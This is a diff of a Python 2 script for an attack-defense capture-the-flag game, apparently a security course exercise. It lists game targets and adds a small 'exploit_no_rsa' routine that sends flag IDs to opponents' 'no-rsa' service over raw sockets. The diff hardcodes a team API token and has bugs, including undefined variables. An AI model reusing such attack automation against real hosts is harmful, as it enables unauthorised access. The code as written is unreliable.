@@ -1,5 +1,6 @@
 from swpag_client import Team
 import json
+import socket
 
 def netcat(hostname, port, content):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -14,6 +15,10 @@ def netcat(hostname, port, content):
     print "Connection closed."
     s.close()
 
+def exploit_no_rsa(hostname, port, flagId):
+    print 'hostname:',hostname, 'port:',port, 'flagId:', flag_id
+    netcat(hostname, port, flag_id)
+
 t = Team("http://actf0.cse545.rev.fish/", "lpmrUtF4wT1mu5FnVN6Tt82LnK1j9n5d")
 print(t.game_url)
 #print(t.get_vm())
@@ -25,10 +30,16 @@ print('services:',services)
 print()
 print()
 for service in services:
-    print('SERVICE NAME:',service)
-    print('SERVICE ID:',service['service_id'])
+    print 'SERVICE NAME:',service
+    print 'SERVICE ID:',service['service_id']
+    print 'service_name:',service_name
     service_id = service['service_id']
+    service_name = service['service_name']
     targets = t.get_targets(service_id)
     for target in targets:
         print('TARGET NAME:',target)#,netcat(target,''))
-	print(netcat(target))
+        hostname = target['hostname']
+        port = target['port']
+        flag_id = target['flag_id']
+        if service_name == 'no-rsa':
+            exploit_no_rsa(hostname,port,flag_id)
